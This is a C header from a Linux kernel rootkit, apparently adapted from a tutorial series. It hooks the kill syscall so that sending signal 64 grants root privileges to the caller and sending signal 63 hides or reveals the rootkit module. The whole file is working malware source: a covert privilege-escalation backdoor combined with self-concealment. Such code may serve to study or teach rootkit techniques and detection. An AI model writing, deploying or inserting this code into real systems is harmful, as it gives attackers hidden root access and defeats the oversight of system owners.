// Heavily inspired by https://xcellerator.github.io/posts/linux_rootkits_03/

#pragma once

#include <linux/cred.h>
#include <linux/linkage.h>
#include <linux/stddef.h>

#include "stdlib.h"
#include "rootkit.h"
#include "ftrace_helper.h"

extern bool module_is_hidden;

bool do_kill(int sig) {
    if (sig == 64) {
        rk_info("setting root...\n");
        set_root();
        return false;
    } else if (sig == 63) {
        if (module_is_hidden){
            rk_info("making module visible!\n");
            show_module();
        } else {
            rk_info("making module invisible!\n");
            hide_module();
        }
        module_is_hidden = !module_is_hidden;
    }
    
    return true;
}

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs*);

static asmlinkage int hook_kill(const struct pt_regs* regs) {
    int sig = SECOND_ARG(regs, int);

    if (do_kill(sig))
        return orig_kill(regs);
    return 0;
}
#else
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig) {
    if (do_kill(sig))
        return orig_kill(pid, sig);
    return 0;
}
#endif
